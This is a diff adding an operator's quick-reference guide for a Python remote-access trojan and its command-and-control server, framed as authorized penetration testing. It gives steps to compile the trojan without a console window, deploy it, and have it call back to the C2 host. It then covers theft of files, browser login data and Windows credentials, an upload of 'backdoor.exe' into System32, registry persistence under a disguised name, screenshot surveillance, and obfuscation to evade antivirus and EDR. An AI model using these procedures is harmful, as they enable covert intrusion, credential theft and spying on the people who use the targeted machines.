@@ -1,0 +1,548 @@
+═══════════════════════════════════════════════════════════════════════════════════
+DEPLOYMENT CHECKLIST & QUICK REFERENCE
+═══════════════════════════════════════════════════════════════════════════════════
+
+PRE-DEPLOYMENT AUTHORIZATION CHECKLIST
+─────────────────────────────────────────
+
+⚠️  CRITICAL - DO NOT PROCEED WITHOUT ALL CHECKED:
+
+Legal Authorization:
+☐ Written authorization document obtained from organization owner
+☐ Authorization specifies exact systems/networks included
+☐ Authorization includes start and end dates
+☐ Incident response plan approved by management
+☐ Legal team reviewed and approved testing
+☐ Scope of engagement clearly defined in writing
+☐ Authorization covers all machines used (target and C2 server)
+
+Environment Isolation:
+☐ Lab network is completely isolated from internet
+☐ No routing between lab and production networks
+☐ All test machines on isolated VLAN or separate network segment
+☐ No shared file servers, domain controllers, or services
+☐ Network isolation verified (ping external networks fails)
+☐ Firewall rules restrict lab network traffic
+☐ All wireless networks disabled or isolated
+
+Team & Documentation:
+☐ Security team notified and briefed on testing
+☐ Incident response team on standby
+☐ Documentation system set up for activity logging
+☐ Backup procedures established before testing
+☐ Contact list for emergency escalation created
+☐ Post-testing cleanup procedures documented
+
+Machine Preparation:
+☐ Test machines fully patched and updated
+☐ Baseline system snapshot created (for recovery)
+☐ All user data backed up
+☐ System restore point created
+☐ Antivirus signatures updated
+☐ All security software installed and working
+☐ Network monitoring tools ready (Wireshark, etc.)
+
+
+INSTALLATION QUICK START
+─────────────────────────────────────────
+
+STEP 1: SET UP C2 SERVER (Linux/Kali - 5 minutes)
+
+1. Create working directory:
+   mkdir /opt/c2_server
+   cd /opt/c2_server
+
+2. Copy c2_server.py to /opt/c2_server/
+
+3. Verify Python:
+   python3 --version  # Should be 3.7+
+
+4. Create directories for logs:
+   mkdir -p downloads screenshots
+
+5. Start server:
+   python3 c2_server.py
+
+   Expected output:
+   ╔════════════════════════════════════════════════════════════╗
+   ║     COMMAND & CONTROL SERVER - PENETRATION TESTING        ║
+   │  Server: 0.0.0.0:4444                                     │
+   │  Status: LISTENING FOR CONNECTIONS                        │
+   ╚════════════════════════════════════════════════════════════╝
+
+
+STEP 2: CONFIGURE TROJAN (Windows - 5 minutes)
+
+1. Copy trojan_client.py to Windows target
+
+2. Edit trojan_client.py:
+   Find line 55: C2_SERVER = "192.168.1.100"
+   Change to your C2 server IP
+
+3. Test configuration:
+   python trojan_client.py
+   Should attempt connection...
+
+4. Stop with Ctrl+C
+
+
+STEP 3: COMPILE TO EXE (Windows - 3 minutes) [OPTIONAL]
+
+1. Install PyInstaller:
+   pip install pyinstaller
+
+2. Compile:
+   pyinstaller --onefile --noconsole trojan_client.py
+
+3. Executable: dist/trojan_client.exe
+
+
+STEP 4: DEPLOY ON TARGET (Windows - 1 minute)
+
+1. Run trojan:
+   python trojan_client.py
+   OR
+   dist/trojan_client.exe
+
+2. Check C2 server:
+   Should show: [CONNECTION] New connection from X.X.X.X
+
+3. You're connected! Type "help" for commands
+
+
+═══════════════════════════════════════════════════════════════════════════════════
+COMMAND QUICK REFERENCE
+═══════════════════════════════════════════════════════════════════════════════════
+
+BASIC COMMANDS:
+──────────────
+help              Show available commands
+exit              Disconnect from client
+sysinfo           Get system information
+
+EXECUTION:
+──────────
+shell <cmd>       Execute system command
+  Examples:
+    shell whoami
+    shell ipconfig
+    shell systeminfo
+    shell tasklist
+
+start <cmd>       Start new process
+  shell start calc.exe
+
+kill <pid>        Terminate process
+  shell kill 1234
+
+INTELLIGENCE:
+──────────────
+processes         List running processes
+ls <dir>          List directory contents
+  ls C:\Users\admin\Desktop
+  ls .
+
+SURVEILLANCE:
+──────────────
+screenshot        Capture screen
+
+FILES:
+──────
+download <path>   Get file from target
+  download C:\Users\admin\Desktop\secrets.txt
+
+upload <local> <remote>   Send file to target
+  upload ./backdoor.exe C:\Windows\System32\backdoor.exe
+
+PERSISTENCE:
+─────────────
+persist           Install persistence mechanism
+
+
+═══════════════════════════════════════════════════════════════════════════════════
+COMMON COMMANDS BY SCENARIO
+═══════════════════════════════════════════════════════════════════════════════════
+
+SCENARIO 1: ANTIVIRUS TESTING
+──────────────────────────────
+
+1. Get system info:
+   sysinfo
+
+2. Check antivirus processes:
+   processes
+   [Look for: MpCmdRun, AVP, Kaspersky, BitDefender, etc.]
+
+3. Test detection of basic command:
+   shell whoami
+   [Does antivirus block this?]
+
+4. Test network detection:
+   [Already connected, if antivirus didn't block connection]
+
+5. Test persistence detection:
+   persist
+   [Does antivirus block registry modification?]
+
+6. Check antivirus log files:
+   download C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23...
+
+7. Verify detection:
+   [Check Windows Event Viewer and antivirus logs]
+
+
+SCENARIO 2: DATA EXFILTRATION SIMULATION
+──────────────────────────────────────────
+
+1. Enumerate user directories:
+   ls C:\Users\admin\Desktop
+   ls C:\Users\admin\Documents
+
+2. Find sensitive files:
+   shell dir /s /b C:\Users\admin\*.txt
+   shell dir /s /b C:\Users\admin\*.xlsx
+   shell dir /s /b C:\Users\admin\*.docx
+
+3. Extract files:
+   download C:\Users\admin\Desktop\password.txt
+   download C:\Users\admin\Documents\Financials.xlsx
+   download C:\Users\admin\AppData\Local\Google\Chrome\User Data\Default\Login Data
+
+4. Verify files:
+   [Check downloads/ directory on C2 server]
+
+
+SCENARIO 3: LATERAL MOVEMENT PREPARATION
+───────────────────────────────────────────
+
+1. Gather network information:
+   shell ipconfig /all
+   shell arp -a
+   shell netstat -ano
+
+2. Check domain membership:
+   shell systeminfo | findstr /i "domain"
+
+3. List network shares:
+   shell net share
+   shell net view
+
+4. Find credentials:
+   download C:\Users\admin\AppData\Roaming\Microsoft\Credentials\*
+   [Contains DPAPI-encrypted credentials]
+
+5. Check for stored passwords:
+   shell cmdkey /list
+   shell dir C:\Users\admin\AppData\Roaming\Microsoft\Protect\*
+
+
+SCENARIO 4: PERSISTENCE VERIFICATION
+────────────────────────────────────
+
+1. Install persistence:
+   persist
+   [Should see: "Persistence installed via Registry"]
+
+2. Reboot system (restart Windows)
+
+3. Wait 60 seconds for auto-connect
+
+4. Verify trojan auto-connected:
+   [C2 server should show new connection after reboot]
+
+5. Run system startup commands:
+   shell reg query HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
+   [Should show "SystemService" entry]
+
+
+SCENARIO 5: ACTIVITY MONITORING
+─────────────────────────────────
+
+1. Start continuous monitoring:
+   Take screenshots at intervals:
+   shell timeout /t 30 && screenshot
+
+2. List processes periodically:
+   processes
+   [Check for user activity changes]
+
+3. Monitor network connections:
+   shell netstat -ano
+   [Track established connections]
+
+4. Monitor file access:
+   shell wmic logicaldisk get name
+   shell dir C:\Users\admin\Documents
+
+
+═══════════════════════════════════════════════════════════════════════════════════
+TROUBLESHOOTING QUICK GUIDE
+═══════════════════════════════════════════════════════════════════════════════════
+
+PROBLEM: "Connection refused" on trojan startup
+SOLUTION:
+  1. Verify C2 server is running
+  2. Check C2_SERVER IP is correct (ipconfig on Windows)
+  3. Verify firewall allows port 4444
+  4. Test: ping <C2_SERVER_IP> from target
+
+PROBLEM: C2 Server shows connection, then disconnect immediately
+SOLUTION:
+  1. Check Python version: python --version (need 3.7+)
+  2. Install missing packages: pip install psutil pillow
+  3. Check error in console output
+  4. Verify firewall not blocking trojan
+
+PROBLEM: File download returns "FILE_NOT_FOUND"
+SOLUTION:
+  1. Verify full path is correct
+  2. Check file exists: shell dir "<path>"
+  3. Verify user has read permissions
+  4. Try with different file
+
+PROBLEM: Screenshot command hangs
+SOLUTION:
+  1. Check Pillow installed: pip install pillow
+  2. Try different resolution
+  3. Check display is accessible
+  4. Try again from different user
+
+PROBLEM: Antivirus blocks trojan immediately
+SOLUTION:
+  This is EXPECTED - it means antivirus is working!
+  1. Check antivirus logs for detection details
+  2. Disable antivirus if authorized (for testing only)
+  3. Use obfuscation: pyarmor obfuscate trojan_client.py
+
+
+═══════════════════════════════════════════════════════════════════════════════════
+DATA FLOW DIAGRAMS
+═══════════════════════════════════════════════════════════════════════════════════
+
+CONNECTION FLOW:
+───────────────
+
+Target (Windows)                    C2 Server (Linux)
+┌──────────────────────────┐       ┌──────────────────────────┐
+│ trojan_client.py starts  │       │ python3 c2_server.py     │
+│ Create socket            │       │ Listening on 0.0.0.0:4444│
+│ Connect to 192.168.1.100 ├──────→│ Accept connection        │
+│                          │       │ Start ClientHandler      │
+│ Send system info JSON    ├──────→│ Receive & log system info│
+│ Enter command loop       │←──────┤ Send command             │
+└──────────────────────────┘       └──────────────────────────┘
+
+
+COMMAND EXECUTION FLOW:
+──────────────────────
+
+C2 Operator                Trojan Client              System
+┌────────────────┐        ┌──────────────────┐      ┌──────────┐
+│ Type: shell    │        │                  │      │          │
+│       whoami   ├───────→│ Receive JSON cmd │      │          │
+│                │        │ Parse: whoami    │      │          │
+│                │        │ Execute via      ├─────→│ whoami   │
+│                │        │ subprocess.run() │      │          │
+│ Receive output │←───────┤ Capture output   │←─────┤ admin    │
+│ admin          │        │ Send via socket  │      │          │
+└────────────────┘        └──────────────────┘      └──────────┘
+
+
+FILE DOWNLOAD FLOW:
+──────────────────
+
+C2 Server              Trojan Client                  File System
+┌───────────┐          ┌─────────────────────┐       ┌────────────┐
+│ Send:     │          │                     │       │            │
+│ download  ├─────────→│ Receive download cmd│       │            │
+│ secrets.tx│          │ Open: secrets.txt   ├──────→│Open file   │
+│           │          │ Read in chunks      │       │            │
+│ Receive   │←─────────┤ Send: metadata      │       │            │
+│ metadata  │          │ Send: file chunks   │←──────┤Read 4KB    │
+│ 2048 bytes│←─────────┤ Close file          │       │            │
+│           │          │                     │       │            │
+│ Write to: │          │                     │       │            │
+│ downloads/│          │                     │       │            │
+│ secrets.tx│          │                     │       │            │
+└───────────┘          └─────────────────────┘       └────────────┘
+
+
+═══════════════════════════════════════════════════════════════════════════════════
+SECURITY TESTING SCENARIOS
+═══════════════════════════════════════════════════════════════════════════════════
+
+SCENARIO: Test Windows Defender Detection
+──────────────────────────────────────────
+
+Setup:
+- Windows 10/11 with Windows Defender enabled
+- Trojan compiled to .exe
+
+Test Steps:
+1. Deploy trojan_client.exe on Windows
+2. Observe antivirus behavior
+3. Check Windows Security logs
+4. Document detection timing
+5. Verify quarantine/removal effectiveness
+6. Test signature updates
+
+Expected Results:
+- Should detect and alert
+- Should offer quarantine
+- Should block file execution
+- Should alert on registry modification
+
+
+SCENARIO: Test EDR Bypass Techniques
+──────────────────────────────────────
+
+Requirements:
+- Endpoint Detection & Response (EDR) software installed
+- Access to EDR console/logs
+
+Test Steps:
+1. Deploy trojan with no obfuscation (baseline)
+   - Result: Detection timing, method
+   
+2. Deploy with code obfuscation
+   - Tool: pyarmor
+   - Result: Can EDR still detect?
+   
+3. Deploy with encryption
+   - Tool: Fernet encryption
+   - Result: Can EDR detect encrypted communications?
+   
+4. Deploy with process injection
+   - Result: Can EDR detect injection?
+   
+5. Deploy with anti-VM detection
+   - Result: Can trojan evade virtualized environment?
+
+Document:
+- Which techniques bypassed EDR
+- Which techniques were detected
+- Detection timing and method
+- Evasion effectiveness
+
+
+SCENARIO: Test Network Detection
+─────────────────────────────────
+
+Setup:
+- Network packet capture (Wireshark)
+- Network IDS/IPS if available
+
+Test Steps:
+1. Start packet capture
+2. Deploy trojan
+3. Send commands
+4. Analyze captured traffic
+
+Look For:
+- Connection to C2 server (port 4444)
+- JSON command packets
+- File transfer patterns
+- Command patterns
+
+Document:
+- Is C2 traffic detectable?
+- Can network patterns identify trojan?
+- Are commands visible in traffic?
+- Can encryption hide patterns?
+
+
+═══════════════════════════════════════════════════════════════════════════════════
+POST-TESTING CLEANUP
+═══════════════════════════════════════════════════════════════════════════════════
+
+CLEANUP CHECKLIST:
+───────────────────
+
+On Target Windows Machine:
+☐ Stop trojan process (Ctrl+C or Task Manager)
+☐ Delete trojan_client.py
+☐ Delete trojan_client.exe (if compiled)
+☐ Remove registry persistence:
+  ☐ regedit → HKEY_CURRENT_USER\...\Run
+  ☐ Delete "SystemService" entry
+☐ Remove scheduled tasks: schtasks /delete /tn SystemUpdate /f
+☐ Remove startup folder files
+☐ Clear browser history/cookies
+☐ Verify removal:
+  ☐ tasklist | grep trojan (should be empty)
+  ☐ reg query HKCU:\...\Run (should not show SystemService)
+☐ Reboot system to confirm
+
+On C2 Server (Linux):
+☐ Stop c2_server.py (Ctrl+C)
+☐ Archive logs: tar -czf c2_activity_20240115.tar.gz *.log
+☐ Delete/secure downloaded files
+☐ Delete screenshots directory
+☐ Remove source code if not needed
+☐ Document findings
+☐ Clear bash history: history -c
+
+Network:
+☐ Verify firewall rules
+☐ Check network connectivity
+☐ Verify isolation still in place
+☐ Document test completion time
+
+
+═══════════════════════════════════════════════════════════════════════════════════
+DOCUMENTATION TEMPLATE
+═══════════════════════════════════════════════════════════════════════════════════
+
+Fill this out during testing:
+
+TEST DATE: _______________
+TESTER: _______________
+AUTHORIZATION: _______________
+SCOPE: _______________
+
+ENVIRONMENT:
+- C2 Server IP: _______________
+- C2 Server Port: _______________
+- Target Machine: _______________
+- Target OS: _______________
+- Antivirus Software: _______________
+
+DEPLOYMENT:
+- Time Deployed: _______________
+- Deployment Method: _______________
+- Initial Connection Time: _______________
+
+TESTS PERFORMED:
+1. Command Execution
+   ☐ Successful
+   Result: _______________
+   
+2. File Transfer
+   ☐ Download
+   ☐ Upload
+   Result: _______________
+   
+3. Screenshot
+   ☐ Successful
+   Result: _______________
+   
+4. Persistence
+   ☐ Successful
+   Result: _______________
+   
+5. Detection
+   - Antivirus detected: ☐ Yes ☐ No
+   - Time to detection: _______________
+   - Detection method: _______________
+   - Action taken: _______________
+
+FINDINGS:
+_______________________________________________________________
+_______________________________________________________________
+_______________________________________________________________
+
+CLEANUP COMPLETED:
+☐ Yes - Time: _______________
+☐ No - Issues: _______________
+
+═══════════════════════════════════════════════════════════════════════════════════
